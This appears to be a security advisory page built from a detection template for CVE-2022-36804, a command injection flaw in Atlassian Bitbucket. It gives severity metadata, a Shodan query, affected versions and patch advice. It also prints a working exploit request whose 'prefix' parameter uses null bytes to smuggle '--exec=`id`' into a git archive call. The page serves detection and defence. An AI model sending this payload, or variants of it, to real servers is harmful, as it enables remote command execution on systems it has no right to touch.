---
layout: post
cve_id: CVE-2022-36804
title: Atlassian Bitbucket - Remote Command Injection
pcap: true
pcap_path: /pcaps/2022/CVE-2022-36804.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-36804.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDk,tess,sullo
severity: high
impact: 'Successful exploitation of this vulnerability can lead to unauthorized access,
  data leakage, and potential compromise of the entire system.

  '
remediation: 'Apply the latest security patches provided by Atlassian to mitigate
  the vulnerability.

  '
reference:
- https://github.com/notdls/CVE-2022-36804
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36804
- https://jira.atlassian.com/browse/BSERV-13438
- https://nvd.nist.gov/vuln/detail/CVE-2022-36804
- http://packetstormsecurity.com/files/171453/Bitbucket-7.0.0-Remote-Command-Execution.html
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 8.8
  cve-id: CVE-2022-36804
  cwe-id: CWE-77
  epss-score: 0.94429
  epss-percentile: 0.99982
  cpe: cpe:2.3:a:atlassian:bitbucket:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: atlassian
  product: bitbucket
  shodan-query: http.component:"BitBucket"
tags:
- cve
- cve2022
- packetstorm
- bitbucket
- atlassian
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
Atlassian Bitbucket Server and Data Center is susceptible to remote command injection. Multiple API endpoints can allow an attacker with read permissions to a public or private Bitbucket repository to execute arbitrary code by sending a malicious HTTP request, thus making it possible to obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials. Affected versions are 7.0.0 before version 7.6.17, from version 7.7.0 before version 7.17.10, from version 7.18.0 before version 7.21.4, from version 8.0.0 before version 8.0.3, from version 8.1.0 before version 8.1.3, and from version 8.2.0 before version 8.2.2, and from version 8.3.0 before 8.3.1.


## üåê HTTP Request
```nohighlight
GET /rest/api/latest/repos HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh, Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.3 Safari/605.1.15
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /rest/api/latest/projects/H225nL/repos/bfvezx/archive?filename=YF2zU&at=YF2zU&path=YF2zU&prefix=ax%00--exec=%60id%60%00--remote=origin HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/129.0
Connection: close
Accept-Encoding: gzip
```

